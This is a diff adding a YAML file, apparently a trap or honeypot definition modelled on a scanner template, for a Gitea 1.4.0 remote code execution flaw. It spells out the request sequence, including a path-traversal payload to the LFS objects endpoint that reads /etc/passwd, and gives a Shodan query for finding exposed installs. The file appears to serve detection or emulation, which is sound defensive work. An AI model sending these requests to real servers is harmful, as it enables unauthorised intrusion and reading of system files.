@@ -1,0 +1,54 @@
+id: gitea-rce
+info:
+  name: Gitea 1.4.0 - Remote Code Execution
+  author: theamanrawat
+  description: 'Gitea 1.4.0 is vulnerable to remote code execution.
+
+    '
+  severity: critical
+  reference:
+  - https://www.exploit-db.com/exploits/44996
+  - https://github.com/kacperszurek/exploits/blob/master/Gitea/gitea_lfs_rce.py
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: 'title:"Installation -  Gitea: Git with a cup of tea"'
+  tags: gitea,rce,unauth,edb
+traps:
+- request:
+    method: GET
+    path: /api/v1/repos/search?limit=1
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: POST
+    path: /.git/info/lfs/objects
+    headers:
+      Content-Type: application/json
+      Accept: application/vnd.git-lfs+json
+    body: |
+      {
+          "Oid": "....../../../etc/passwd",
+          "Size": 1000000,
+          "User" : "{{randstr}}",
+          "Password" : "{{randstr}}",
+          "Repo" : "{{randstr}}",
+          "Authorization" : "{{randstr}}"
+      }
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
